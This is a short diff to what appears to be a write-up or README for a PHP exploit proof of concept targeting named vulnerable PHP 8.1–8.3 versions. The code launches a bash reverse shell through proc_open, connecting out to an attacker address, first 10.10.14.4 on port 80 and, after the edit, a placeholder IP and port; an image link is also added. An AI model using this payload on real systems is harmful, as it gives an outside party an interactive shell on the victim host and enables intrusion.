@@ -37,7 +37,7 @@ from team [bi0s](https://bi0s.in)
 <?php
 // Vulnerable PHP versions: 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8
 
-$command = "bash -c 'bash -i >& /dev/tcp/10.10.14.4/80 0>&1'";
+$command = "bash -c 'bash -i >& /dev/tcp/{Custom_IP}/{Custom_PORT} 0>&1'";
 $descriptors = [
   0 => ['pipe','r'],
   1 => ['pipe','w'],
@@ -53,3 +53,8 @@ if (is_resource($process)) {
 
 ?>
 ```
+
+<img width="1878" height="891" alt="image" src="https://github.com/user-attachments/assets/ea05cfe4-3f7c-4601-b4b5-d7454c82b651" />
+
+
+
